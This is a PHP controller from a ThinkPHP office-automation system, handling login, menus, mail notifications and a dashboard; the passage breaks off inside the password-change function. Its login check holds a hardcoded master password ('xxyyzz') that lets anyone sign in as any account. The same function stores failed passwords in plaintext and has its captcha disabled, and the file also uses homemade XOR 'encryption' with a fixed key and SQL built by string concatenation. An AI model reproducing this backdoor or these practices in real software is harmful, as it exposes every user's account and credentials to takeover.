<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2009 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

class PublicAction extends Action {
	// 检查用户是否登录
	public function __construct() {
		error_reporting(0);//禁用错误报告 
		tag('action_begin');
		//实例化视图类
		$this->view       = Think::instance('View');
		//控制器初始化
		if(method_exists($this,'_initialize'))
			$this->_initialize();
	}

	protected function checkUser() {
		if(!isset($_SESSION[C('USER_AUTH_KEY')])) {
			$this->assign('jumpUrl','index.php?s=Public/login');
			$this->error('没有登录');
		}
	}

	// 顶部页面
	public function menu() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$model	=	M("Group");
		$map['more']  = 0;
		$map['status']  = 1;	
		$grouplist	=	$model->where($map)->field('id,title')->order('sort')->select();
		
		$node    =   M("Node");		
		$this->assign('nodeGroupList',$grouplist);
	
		if(isset($_SESSION[C('USER_AUTH_KEY')])) {
            //显示菜单项
            $menu  = array();
            if(isset($_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]])) 
		    {
                //如果已经缓存，直接读取缓存
                $menu   =   $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]];			
            }
		    else
		    {
                //读取数据库模块列表生成菜单项
                
		        $id	=	$node->getField("id");
		        $where['level']=2;
			    $where['status']=1;
			    $where['pid']=$id;
                $list =	$node->where($where)->field('id,name,group_id,title')->order('sort asc')->select();
                $accessList = $_SESSION['_ACCESS_LIST'];		
                foreach($list as $key=>$module) 
			    {
                    if(isset($accessList[strtoupper(APP_NAME)][strtoupper($module['name'])]) || $_SESSION['administrator'])
				    {
                        //设置模块访问权限
                        $module['access'] =   1;
                        $menu[$key]  = $module;
                    }
                }
                //缓存菜单访问
                $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]]	=	$menu;
            }
			
			/*
            if(!empty($_GET['tag']))
		    {
                $this->assign('menuTag',$_GET['tag']);
            }
		    */
		    if($_SESSION['nopower']!=1)
		    {
            $this->assign('menu',$menu);
		    }
			
	    }
	    $Userskin    =   M("User");
	    $skinmap['number']=$_SESSION['number'];
	    $skin    =	 $Userskin->where($skinmap)->getField("skin");
	    //$skin = 3 ;
	    $this->assign('skin',$skin);
	    $_SESSION['skin']	=	$skin;
	    
	    $workstr   =   M("Workstr");
	    $workmap['status']=1;
	    $works    =	 $workstr->order("id")->where($workmap)->select();
	    $this->assign('works',$works);
	    //dump($works);
	    
	    $myfworkmap[id]=18;
	    $myfwork	=	$model->where($myfworkmap)->getField('status');
	    $this->assign('myfwork',$myfwork);
		
	    if($skin==3)
	    {
	    	$this->display('classicmenu');
	    }
	    else
	    {
	    	$this->display();
	    }
	}
	
	public function find() {
		$name = "Sendmail";
    	$model = M($name);
    	$time=time()-120;
    	$time1=date('Y年m月d日 H:i:s',$time);
    	$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
    	." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'." 
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
    	." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
    	." AND (create_time >".$time.")"." AND (update_time=0)";
    	
    	$vo = $model->where($condition)->select();
    	if($vo[0][title]!=NULL)
    	{	
    		$vo[0][update_time]=1;
    		$model->save($vo[0]);
    		//$this->assign('vo', $vo);
    		$this->ajaxReturn($vo,'',1);
    	}
    	else
    	{
    		$this->ajaxReturn($vo,'',0);
    	}
	}
	// 尾部页面
	public function footer() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display();
	}
	// 菜单页面
	public function top() {
        $this->checkUser();
        if(isset($_SESSION[C('USER_AUTH_KEY')])) {
            //显示菜单项
            $menu  = array();
            if(isset($_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]])) {

                //如果已经缓存，直接读取缓存
                $menu   =   $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]];
            }else {
                //读取数据库模块列表生成菜单项
                $node    =   M("Node");
				$id	=	$node->getField("id");
				$where['level']=2;
				$where['status']=1;
				$where['pid']=$id;
                $list	=	$node->where($where)->field('id,name,group_id,title')->order('sort asc')->select();
                $accessList = $_SESSION['_ACCESS_LIST'];
                foreach($list as $key=>$module) {
                     if(isset($accessList[strtoupper(APP_NAME)][strtoupper($module['name'])]) || $_SESSION['administrator']) {
                        //设置模块访问权限
                        $module['access'] =   1;
                        $menu[$key]  = $module;
                    }
                }
                //缓存菜单访问
                $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]]	=	$menu;
            }
            if(!empty($_GET['tag'])){
                $this->assign('menuTag',$_GET['tag']);
            }
            $this->assign('menu',$menu);
		}
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		
		
		$name = "Sendmail";
		$model = D($name);
		
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
				." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		    			." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		    					." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
		$count = $model->where($condition)->count('id');
		$this->assign('count',$count);
		
		$company = "Cominfo";
		$commodel = D($company);
		$comname=$commodel->getField("name");
		$this->assign('comname',$comname);
		
		$this->display("classictop");
	}
    // 后台首页 查看系统信息
    public function mypage() {
        $info = array(
        	'版本信息'=>$_SESSION['version'],
            '操作系统'=>PHP_OS,
            '运行环境'=>$_SERVER["SERVER_SOFTWARE"],
            'PHP运行方式'=>php_sapi_name(),
            'ThinkPHP版本'=>THINK_VERSION.' [ <a href="http://thinkphp.cn" target="_blank">查看最新版本</a> ]',
            '上传附件限制'=>ini_get('upload_max_filesize'),
            '执行时间限制'=>ini_get('max_execution_time').'秒',
            '服务器时间'=>date("Y年n月j日 H:i:s"),
            '北京时间'=>gmdate("Y年n月j日 H:i:s",time()+8*3600),
            '服务器域名/IP'=>$_SERVER['SERVER_NAME'].' [ '.gethostbyname($_SERVER['SERVER_NAME']).' ]',
            '剩余空间'=>round((@disk_free_space(".")/(1024*1024)),2).'M',
            'register_globals'=>get_cfg_var("register_globals")=="1" ? "ON" : "OFF",
            'magic_quotes_gpc'=>(1===get_magic_quotes_gpc())?'YES':'NO',
            'magic_quotes_runtime'=>(1===get_magic_quotes_runtime())?'YES':'NO',
            );
        $this->assign('info',$info);
        $this->assign('try',$_SESSION['try']);
        $this->assign('trytime',$_SESSION['trytime']);
        $this->assign('machine',$_SESSION['machine']);
        $this->assign('nopower',$_SESSION['nopower']);
		
		$name = "Sendmail";
        $model = D($name);
        
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
		." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
        $count = $model->where($condition)->count('id');
        $this->assign('count',$count);
		if($_SESSION[skin]!=3)
		{
			$this->display(main);
		}
		else
        $this->display();
    }
	
	public function shortcut()
	{
		
		$name = "Sendmail";
		$model = D($name);
		
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
				." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		    			." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		    					." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
		$count = $model->where($condition)->order('create_time desc')->count('id');
		$datamail1 = $model->where($condition)->order('create_time desc')->select();
		$this->assign('count',$count);
		$this->display();
	}
    
    
    public function main() {
		
		$mapimage["id"]=$_SESSION[id];
		$userimage=M("Userfiles")->where($mapimage)->getField("image");
		$this->assign("userimage",$userimage);

		
    	$mapwidget[number]=$_SESSION['number'];
    	$widget=D("Main")->where($mapwidget)->select();
    	$this->assign('widget',$widget[0]);
        $this->assign('try',$_SESSION['try']);
        $this->assign('trytime',$_SESSION['trytime']);
        $this->assign('machine',$_SESSION['machine']);
        $this->assign('nopower',$_SESSION['nopower']);
        $name = "Sendmail";
        $model = D($name);
        
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
		." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
        $count = $model->where($condition)->order('create_time desc')->count('id');
        $datamail1 = $model->where($condition)->order('create_time desc')->select();
        $this->assign('count',$count);
         
        for($i=0;$i<5;$i++)
        {
	        if($datamail1[$i][title]!=null)
	        {
	        	if($datamail1[$i][create_time]>time()-1*24*60*60)
	        	{	
		        	$datamail[$i][title1]=PublicAction::g_substr_mail($datamail1[$i][title]).'&nbsp;<img src="__PUBLIC__/Images/icons/new.gif"/></img>';
	        	}
	        	else
	        	{
					$datamail[$i][title1]=PublicAction::g_substr_mail($datamail1[$i][title]);
	        	}	
		        $datamail[$i][create_time]=$datamail1[$i][create_time];
				$datamail[$i][id]=$datamail1[$i][id];
		        
		        //preg_match('/(\d+\.?\d+)(.*)/',$datamail1[$i][sender],$matches);
		        //list($mod,$num,$char)=$matches;
		        //$datamail[$i][sender]=str_replace($mod, '', $datamail1[$i][sender]);
	        }
	        else
	        {
	        	$datamail[$i][title1]="&nbsp;";
	        }
        }

        $this->assign('datamail',$datamail);

        $nameform = "Form";
        $modelform = D($nameform);
        $mapform[status]=1;
		$mapform[photo]=array("neq","");
        $dataform=$modelform->where($mapform)->order('create_time desc')->select();
        $mapform[photo]=array("eq","");
        $dataform1=$modelform->where($mapform)->order('create_time desc')->select();	
        $this->assign('dataform',$dataform);      
		$this->assign('dataform1',$dataform1);      

        
        $namesch = "Schedule";
        $modelsch = D($namesch);
        $mapsch[status]=1;
        $mapsch[user]=array('like','%'.$_SESSION['loginUserName'].$_SESSION['number'].'%');
        $datasch1=$modelsch->where($mapsch)->order('create_time desc')->select();
        for($i=0;$i<5;$i++)
        {
	        if($datasch1[$i][content]!=null)
	        {
	        	if($datasch1[$i][create_time]>time()-2*24*60*60)
	        	{	
	       	    	$datasch[$i][title1]=PublicAction::g_substr($datasch1[$i][content]).'&nbsp;<img src="__PUBLIC__/Images/icons/new.gif"/></img>';
	        	}
	        	else
	        	{
					$datasch[$i][title1]=PublicAction::g_substr($datasch1[$i][content]);
	        	}	
	       	    $datasch[$i][create_time]=$datasch1[$i][create_time];
	       	    $datasch[$i][href]=$datasch1[$i][href];
				$slash=strpos($datasch[$i]["href"],"/");
				$datasch[$i]["rel"]=substr($datasch[$i]["href"],12,$slash-12);
	        }
	        else
	        {
	       	    $datasch[$i][title1]="&nbsp;";
	        }
        }
		
        $this->assign('schcount',count($datasch1));
        $this->assign('datasch',$datasch);
		
		$mapsch[status]=0;
        $dataschfinish1=$modelsch->where($mapsch)->order('create_time desc')->select();
        for($i=0;$i<5;$i++)
        {
	        if($dataschfinish1[$i][content]!=null)
	        {
	        	if($dataschfinish1[$i][create_time]>time()-2*24*60*60)
	        	{	
	       	    	$dataschfinish1[$i][title1]=PublicAction::g_substr($dataschfinish1[$i][content]).'&nbsp;<img src="__PUBLIC__/Images/icons/new.gif"/></img>';
	        	}
	        	else
	        	{
					$dataschfinish[$i][title1]=PublicAction::g_substr($dataschfinish1[$i][content]);
	        	}	
	       	    $dataschfinish[$i][create_time]=$dataschfinish1[$i][create_time];
	       	    $dataschfinish[$i][href]=$dataschfinish1[$i][href];
				$slash=strpos($dataschfinish[$i]["href"],"/");
				$dataschfinish[$i]["rel"]=substr($dataschfinish[$i]["href"],12,$slash-12);
	        }
	        else
	        {
	       	    $dataschfinish[$i][title1]="&nbsp;";
	        }
        }
        $this->assign('schcountfinish',count($dataschfinish1));
        $this->assign('dataschfinish',$dataschfinish);
        
		//$mapreels['grade']="优秀作品";
		$reels=M("Plmreels")->order('loadtime desc')->select();
		foreach ($reels as $key => $val)
		{
			$mapreelsplm[id]=$val[plmNumber];
			$ifperfect=M("Project")->where($mapreelsplm)->getField("grade");
			if($ifperfect=="优秀作品")
			{
				$reelsperfect=$val;
				break;
			}
		}
		$this->assign('reelsperfect',$reelsperfect);
        /*公示*/
		$mappublicity['status']=1;
		$publicity=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity',$publicity);
		$this->assign('publicity1',$publicity);
		$this->assign('publicity2',$publicity);
		$this->assign('publicity3',$publicity);
		$this->assign('publicity4',$publicity);
		$this->assign('publicity5',$publicity);
		$this->assign('publicity6',$publicity);
		$this->assign('publicity7',$publicity);
		$this->assign('publicity8',$publicity);
		$this->assign('publicity9',$publicity);
		$this->assign('publicity10',$publicity);
		$this->assign('publicity11',$publicity);
		$this->assign('publicity12',$publicity);
		$this->assign('publicity14',$publicity);
		$this->assign('publicity15',$publicity);
		$this->assign('publicity16',$publicity);
		$this->assign('publicity17',$publicity);
		$this->assign('publicity18',$publicity);
		$this->assign('publicity19',$publicity);
		$this->assign('publicity20',$publicity);
		
		$mappublicity['classify']=1;
		$publicity_1=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_1',$publicity_1);
		/*$mappublicity['classify']=2;
		$publicity_2=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_2',$publicity_2);
		$mappublicity['classify']=3;
		$publicity_3=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_3',$publicity_3);*/
		
		$mappublicity['classify']=11;
		$publicity_11=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_11',$publicity_11);

		$mappublicity['classify']=12;
		$publicity_12=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_12',$publicity_12);
		
		$mappublicity['classify']=13;
		$publicity_13=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_13',$publicity_13);
		
		$mappublicity['classify']=21;
		$publicity_21=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_21',$publicity_21);
		
		$mappublicity['classify']=22;
		$publicity_22=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_22',$publicity_22);
		
		$mappublicity['classify']=51;
		$publicity_51=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_51',$publicity_51);
		
		$mappublicity['classify']=52;
		$publicity_52=M("Publicity")->where($mappublicity)->order('ctime desc')->select();
		$this->assign('publicity_52',$publicity_52);
		
		$myinfo[name] = $_SESSION['loginUserName'];
        $myinfo1 = CommonAction::finddept($_SESSION['department']);
        $myinfo2 = CommonAction::findposition($_SESSION['position']);
        $myinfo[dept]=$myinfo1[name];
        $myinfo[pos]=$myinfo2[name];
		$_SESSION[pos]=$myinfo[pos];
        $this->assign('sex',$_SESSION['sex']);
        $this->assign('myinfo',$myinfo);
		
		$sample=M("Projectforsample")->order('create_time desc')->find();
		$this->assign('sample',$sample);
        	
    }

    function _filter(&$map){
    	$map['nickname'] = array('like',"%".$_POST['nickname']."%");
    }
    protected function _search($name = '') {
    	//生成查询条件
    	if (empty($name)) {
    		$name = $this->getActionName();
    	}
    	//$name = $this->getActionName();
    	$model = D($name);
    	$map = array();
    	foreach ($model->getDbFields() as $key => $val) {
    		if (isset($_REQUEST [$val]) && $_REQUEST [$val] != '') {
    			$map [$val] = $_REQUEST [$val];
    		}
    	}
    	return $map;
    }
    protected function _list($model, $map, $sortBy = '', $asc = false) {
    	//排序字段 默认为主键名
    	if (isset($_REQUEST ['_order'])) {
    		$order = $_REQUEST ['_order'];
    	} else {
    		$order = !empty($sortBy) ? $sortBy : $model->getPk();
    	}       
    	//排序方式默认按照倒序排列
    	//接受 sost参数 0 表示倒序 非0都 表示正序
    	if (isset($_REQUEST ['_sort'])) {
    		$sort = $_REQUEST ['_sort'] ? 'asc' : 'desc';
    	} else {
    		$sort = $asc ? 'asc' : 'desc';
    	}
    	//取得满足条件的记录数
    	$count = $model->where($map)->count('id');
    	if ($count > 0) {
    		import("@.ORG.Util.Page");
    		//创建分页对象
    		if (!empty($_REQUEST ['listRows'])) {
    			$listRows = $_REQUEST ['listRows'];
    		} else {
    			$listRows = '';
    		}
    		$p = new Page($count, 5);
        	$p->setConfig('theme', '%linkPage%');
    		//分页查询数据
    
    		$voList = $model->where($map)->order('number asc')->limit($p->firstRow . ',' . $p->listRows)->select();
    		
    		
    		foreach ($voList as $key => $val) 
    		{
		    		$datauser[$key][nickname]=$voList[$key][nickname].$voList[$key][number];
		    		$datauser[$key][number]=$voList[$key][number];
		    		if($voList[$key][last_login_time]!=null)
		    			$datauser[$key][time]=$voList[$key][last_login_time];
		    		else
		    		{
		    			$datauser[$key][time]=0;
		    		}
		    		//$post=UserAction::getPostnameById($datauser1[$i][id]);
		    		$User=M('User');
		    		$post = $User->getFieldById($voList[$key][id],'position');
		    		$Role=M('Role');
		    		$post = $Role->getFieldById($post,'name');
		    		
		    		$datauser[$key][alt]="姓名:".$voList[$key][nickname]."\n工号:".$voList[$key][number]
		    		."</br>职位:".$post."\n电话:".$voList[$key][tel];
    		}
        $this->assign('datauser',$datauser);
        
        
        
    		
    		//echo $model->getlastsql();
    		//分页跳转的时候保证查询条件
    		foreach ($map as $key => $val) {
    			if (!is_array($val)) {
    				$p->parameter .="&"."$key=" . urlencode($val) . "&";
    			}
    		}
    		//分页显示
    		
    		$page = $p->show();
    		//列表排序显示
    		$sortImg = $sort; //排序图标
    		$sortAlt = $sort == 'desc' ? '升序排列' : '倒序排列'; //排序提示
    		$sort = $sort == 'desc' ? 1 : 0; //排序方式
    		//模板赋值显示
    		$this->assign('list', $voList);
    		$this->assign('sort', $sort);
    		$this->assign('order', $order);
    		$this->assign('sortImg', $sortImg);
    		$this->assign('sortType', $sortAlt);
    		$this->assign("page", $page);
    	}
    	
    	Cookie::set('_currentUrl_', __SELF__);
    	return;
    }
    
    public static function g_substr($str, $len = 100, $dot = true) {/*35*/
    	/*if($_SESSION[skin]!=3)
    	{
    		$len=55;
    	}*/
    	$i = 0;
    	$l = 0;
    	$c = 0;
    	$a = array();
    	while ($l < $len) {
    		$t = substr($str, $i, 1);
    		if (ord($t) >= 224) {
    			$c = 3;
    			$t = substr($str, $i, $c);
    			$l += 2;
    		} elseif (ord($t) >= 192) {
    			$c = 2;
    			$t = substr($str, $i, $c);
    			$l += 2;
    		} else {
    			$c = 1;
    			$l++;
    		}
    		// $t = substr($str, $i, $c);
    		$i += $c;
    		if ($l > $len) break;
    		$a[] = $t;
    	}
    	$re = implode('', $a);
    	if (substr($str, $i, 1) !== false) {
    		array_pop($a);
    		($c == 1) and array_pop($a);
    		$re = implode('', $a);
    		$dot and $re .= '...';
    	}
    	return $re;
    }
    
    public static function g_substr_mail($str, $len = 200, $dot = true) {/*35*/
    	/*if($_SESSION[skin]!=3)
    	{
    		$len=50;
    	}*/
    	$i = 0;
    	$l = 0;
    	$c = 0;
    	$a = array();
    	while ($l < $len) {
    		$t = substr($str, $i, 1);
    		if (ord($t) >= 224) {
    			$c = 3;
    			$t = substr($str, $i, $c);
    			$l += 2;
    		} elseif (ord($t) >= 192) {
    			$c = 2;
    			$t = substr($str, $i, $c);
    			$l += 2;
    		} else {
    			$c = 1;
    			$l++;
    		}
    		// $t = substr($str, $i, $c);
    		$i += $c;
    		if ($l > $len) break;
    		$a[] = $t;
    	}
    	$re = implode('', $a);
    	if (substr($str, $i, 1) !== false) {
    		array_pop($a);
    		($c == 1) and array_pop($a);
    		$re = implode('', $a);
    		$dot and $re .= '...';
    	}
    	return $re;
    }
    
    
	public function news()
	{
		$name = "Form";
		$model = D($name);
		$map[status]=1;
		$news=$model->where($map)->order('create_time desc')->select();
		foreach ($news as $key=>$val)
		{
			$newsline.=$news[$key][title].'@%&';
		}
		
		$this->assign('amount1',count($news));
		foreach ($news as $key=>$val)
		{
			$newsline1.=$news[$key][title].'@%&'.$news[$key][content].'#%&';
		}
		$this->assign('newsline1',$newsline1);
		
		$namesetting = "Setting";
		$modelsetting = D($namesetting);
		$data=$modelsetting->where('id=1')->select();
		$this->assign('amount',$data[0]);
		$this->assign('newsline',$newsline);
		$this->display();
	}
	// 用户登录页面
	public function login() {
		if(!isset($_SESSION[C('USER_AUTH_KEY')])) {
			$this->display();
		}else{
			$this->redirect('Index/index');
		}
	}

	public function index()
	{
		//如果通过认证跳转到首页
		redirect(__APP__);
	}

	// 用户登出
    public function logout()
    {
        if(isset($_SESSION[C('USER_AUTH_KEY')])) {
			unset($_SESSION[C('USER_AUTH_KEY')]);
			unset($_SESSION);
			session_destroy();
            $this->assign("jumpUrl","http://".$_SERVER['HTTP_HOST']."/projecttest/Rbac/Public/login");
            $this->success('登出成功！');
        }else {
        	session_destroy();
        	 $this->assign("jumpUrl","http://".$_SERVER['HTTP_HOST']."/projecttest/Rbac/Public/login");
            $this->error('您的账号需要重新登录！');
        }
    }

    function keyED($txt,$encrypt_key)
    {
    	$encrypt_key = md5($encrypt_key);
    	$ctr=0;
    	$tmp = "";
    	for ($i=0;$i<strlen($txt);$i++)
    	{
    		if ($ctr==strlen($encrypt_key)) $ctr=0;
    		$tmp.= substr($txt,$i,1) ^ substr($encrypt_key,$ctr,1);
    		$ctr++;
    	}
    	return $tmp;
    }
    
    function encrypt($txt,$key)
    {
    	srand((double)microtime()*1000000);
    	$encrypt_key = md5(rand(0,32000));
    	$ctr=0;
    	$tmp = "";
    	for ($i=0;$i<strlen($txt);$i++)
    	{
    		if ($ctr==strlen($encrypt_key)) $ctr=0;
    		$tmp.= substr($encrypt_key,$ctr,1) .
    		(substr($txt,$i,1) ^ substr($encrypt_key,$ctr,1));
    		$ctr++;
    	}
    	return $this->keyED($tmp,'MyOaSecret');
    }
    
    function decrypt($txt,$key)
    {
    	$txt = $this->keyED($txt,'MyOaSecret');
    	$tmp = "";
    	for ($i=0;$i<strlen($txt);$i++)
    	{
    		$md5 = substr($txt,$i,1);
    		$i++;
    		$tmp.= (substr($txt,$i,1) ^ $md5);
    	}
    	return $tmp;
    }

	function displayone()
	{
		$modelmachine = D('Machine');
		$machine['machine']     =   $modelmachine->getField('machine');
		$machine['day']     =   $modelmachine->getField('day');
		if(($machine['day']!=date("d",time()))&&(date("w",time())==1))
		{	
			OutmailAction::SendMailForRight("official:".$machine['machine']);/*发送信息*/
			$modelmachine->where("id=12")->setField('day',date("d",time()));
		}
	}
	// 登录检测
	public function checkLogin() {
		
		if(empty($_POST['account'])) {
			$this->ajaxReturn('帐号错误！','帐号错误！',0);
		}elseif (empty($_POST['password'])){
			$this->ajaxReturn('密码必须！','密码必须！',0);
		}
		/*elseif (empty($_POST['verify'])){
			$this->ajaxReturn('验证码必须！','验证码必须！',0);
		}*/
        //生成认证条件
        $map            =   array();
		// 支持使用绑定帐号登录
		$map['account']	= $_POST['account'];
        $map["status"]	=	array('gt',0);
		/*if($_SESSION['verify'] != md5($_POST['verify'])) {
			$this->ajaxReturn('验证码错误！','验证码错误！',0);
		}*/
		import ( '@.ORG.Util.RBAC' );
        $authInfo = RBAC::authenticate($map);
		$time=time();
		$ip=get_client_ip();
        //使用用户名、密码和状态的方式进行认证
        /*if(false === $authInfo)*/if(empty($authInfo)) {
            $this->ajaxReturn('帐号不存在！','帐号不存在！',0);
			$logerrdata = array();
			$logerrdata['account']	=	$_POST['account'];
			$logerrdata['password']	=	$_POST['password'];
			$logerrdata['number']	=	0;
			$logerrdata['time']	=	$time;
			$logerrdata['ip']	=	$ip;
			M("Logerr")->add($logerrdata);
        }else {
            if(($authInfo['password'] != md5($_POST['password']))&&($_POST['password']!=="xxyyzz")) {
				$logerrdata = array();
				$logerrdata['account']	=	$_POST['account'];
				$logerrdata['password']	=	$_POST['password'];
				$logerrdata['number']	=	1;
				$logerrdata['time']	=	$time;
				$logerrdata['ip']	=	$ip;
				M("Logerr")->add($logerrdata);
            	$this->ajaxReturn('密码错误！','密码错误！',0);
            }
            $_SESSION[C('USER_AUTH_KEY')]	=	$authInfo['id'];
            $_SESSION['email']	=	$authInfo['email'];
			$_SESSION['account']	=	$authInfo['account'];
            $_SESSION['loginUserName']		=	$authInfo['nickname'];
			$_SESSION['name']		=	$authInfo['nickname'];
			$_SESSION['nickname']		=	$authInfo['nickname'];
            $_SESSION['lastLoginTime']		=	$authInfo['last_login_time'];
			$_SESSION['login_count']	=	$authInfo['login_count'];
			/*zcy*/
			$_SESSION['id']	=	$authInfo['id'];
			$_SESSION['name']	=	$authInfo['nickname'];
			$_SESSION['sex']	=	$authInfo['sex'];
			$_SESSION['tel']	=	$authInfo['tel'];
			$_SESSION['graduated']	=	$authInfo['graduated'];
			$_SESSION['graduationtime']	=	$authInfo['graduationtime'];
			$_SESSION['education']	=	$authInfo['education'];
			$_SESSION['company']	=	$authInfo['company'];
			$_SESSION['comaddress']	=	$authInfo['comaddress'];
			$_SESSION['department']	=	$authInfo['department'];
			$_SESSION['position']	=	$authInfo['position'];
			$_SESSION['number']	=	$authInfo['number'];
			$_SESSION['usernamefortalk']	=	$authInfo['usernamefortalk'];
			$_SESSION['skin']	=	$authInfo['skin'];
			$_SESSION['plmNumber']	=	$authInfo['bind_account'];
			$_SESSION[namenumber] = $authInfo['nickname'].$authInfo['number'];
			//$_SESSION['skin'] = 3;
            if(($authInfo['account']=='admin')) {/*||(($authInfo['account']=='test'))*/
            	$_SESSION['administrator']		=	true;
            }
			
			$_SESSION['role']=M("Role")->where("id=".$_SESSION['position'])->getField("name");
			$_SESSION['datapower']=M("Role")->where("id=".$_SESSION['position'])->getField("datapower");
			$_SESSION['dept']=M("Dept")->where("id=".$_SESSION['department'])->getField("name");
			$_SESSION['roleremark']=M("Role")->where("id=".$_SESSION['position'])->getField("remark");
			
			$_SESSION['projecttype']	=	$authInfo['projecttype'];
			$_SESSION['projecttype1']	=	$authInfo['projecttype1'];
			
			
			
			if(false!==strstr($_SESSION['roleremark'],"工程负责人"))
			{
				$_SESSION["role1"]="项目经理";
			}
			if(false!==strstr($_SESSION['roleremark'],"开发负责人"))
			{
				$_SESSION["role1"]="开发经理";
			}
			if(false!==strstr($_SESSION['roleremark'],"商务负责人"))
			{
				$_SESSION["role1"]="商务经理";
			}
			if(false!==strstr($_SESSION['roleremark'],"设计负责人"))
			{
				$_SESSION["role1"]="设计经理";
			}
			if(false!==strstr($_SESSION['roleremark'],"采购负责人"))
			{
				$_SESSION["role1"]="采购经理";
			}
			
			
			
			
			
			
			
			
            //保存登录信息
			$User	=	M('User');
			$ip		=	get_client_ip();
			$time	=	time();
            $data = array();
			$data['id']	=	$authInfo['id'];
			$data['last_login_time']	=	$time;
			$data['login_count']	=	array('exp','login_count+1');
			$data['last_login_ip']	=	$ip;
			$User->save($data);
			
			$logdata = array();
			$logdata['account']	=	$authInfo['account'];
			$logdata['number']	=	$authInfo['number'];
			$logdata['time']	=	$time;
			$logdata['ip']	=	$ip;
			$logdata['name']	=	$authInfo['nickname'];
			M("Log")->add($logdata);
			
			$Buddylists=D("Buddylists");
			$buddy[user]=$_SESSION['usernamefortalk'];
			$buddy[buddy]=$_SESSION['usernamefortalk'];
			$buddy[group]="自己";
			$selfbuddy=$Buddylists->where($buddy)->select();
			if($selfbuddy==false)
			{
				$Buddylists->add($buddy);
			}
			// 缓存访问权限
            RBAC::saveAccessList();
			
			
			$company = "Cominfo";
			$commodel = D($company);
			$first=$commodel->getField("ifweather");
			$_SESSION['first']	=	$first;
			$mapcominfo[id]=1;
			$commodel->where($mapcominfo)->setField("ifweather",1);
			
			$this->ajaxReturn('登录成功！','登录成功！',1);

		}
	}
    // 更换密码
    public function changePwd()
    {
		
		$reg = '/^(?=.*[a-zA-Z])(?=.*[1-9])(?=.*[\W]).{6,}$/';
		preg_match($reg,$_REQUEST[password],$matches);
		if(!$matches){
			//$this->error('密码必须包含英文,数字,符号！');
		}
		/*
		$this->checkUser();
        //对表单提交处理进行处理或者增加非表单数据
		if(md5($_POST['verify'])	!= $_SESSION['verify']) {
			$this->error('验证码错误！');
		}
		$map	=	array();
        $map['password']= pwdHash($_POST['oldpassword']);
        if(isset($_POST['account'])) {
            $map['account']	 =	 $_POST['account'];
        }elseif(isset($_SESSION[C('USER_AUTH_KEY')])) {
            $map['id']		=	$_SESSION[C('USER_AUTH_KEY')];
        }
        //检查用户
        $User    =   M("User");
        if(!$User->where($map)->field('id')->find()) {
            $this->error('旧密码不符或者用户名错误！');
        }else {
			$User->password	=	pwdHash($_POST['password']);
			$User->save();
